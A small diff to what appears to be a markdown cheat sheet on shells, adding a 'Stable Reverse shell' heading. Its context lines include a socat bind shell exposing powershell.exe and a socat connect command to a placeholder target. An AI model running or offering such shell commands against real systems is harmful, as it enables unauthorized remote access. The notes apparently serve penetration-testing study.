@@ -52,3 +52,6 @@ PS C:\Users\user> socat TCP-L:<PORT> EXEC:powershell.exe,pipes
 user@ip: ~$ socat TCP:<TARGET-IP>:<TARGET-PORT> -
 ```
 
+
+## __Stable Reverse shell__
+
